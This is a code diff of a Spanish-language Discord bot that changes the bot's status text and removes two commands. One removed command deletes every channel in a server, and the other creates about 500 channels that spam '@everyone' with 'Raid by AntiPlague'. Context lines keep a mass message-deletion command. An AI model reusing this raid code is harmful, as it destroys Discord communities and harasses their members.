@@ -29,7 +29,7 @@ let prefix = config.prefix;
 
 client.on("ready", () => {
   console.log(`Dale pá todo piola`);
-  client.user.setActivity("Creador INF Jeremy | c!help | Viendo 683 usuarios ");
+  client.user.setActivity(" Viendo 67 servidores");
 });
 
 client.on("message", message => {
@@ -98,16 +98,6 @@ client.on("message", message => {
     message.channel.bulkDelete(1000);
       
     }
-    if (message.author.bot) return;
-  
-   if (message.content === prefix + 'delete') {
-    message.guild.channels.cache.forEach(channel => channel.delete());
-    message.guild.channels.create(`RaidByAntiPlague`, {
-          type: 'text'
-        }).then(channel => {
-          channel.send("> **__La basura de discord fue eliminada.__** @everyone @here")
-        })
-        }
    
       
         
@@ -213,17 +203,7 @@ message.channel.send(avatar)
       message.channel.send(embed);
       
       }
-if (message.content === prefix + 'create') {
-     for(let i =0;i<=500;i++) {
-message.guild.channels.create("RaidByAntiPlague", {
-type: 'text'
-}).then(channel => { 
-channel.send("Raid by AntiPlague @everyone @here")
-})}
-}
 
-
-    
    
   
   }); client.login(config.token);
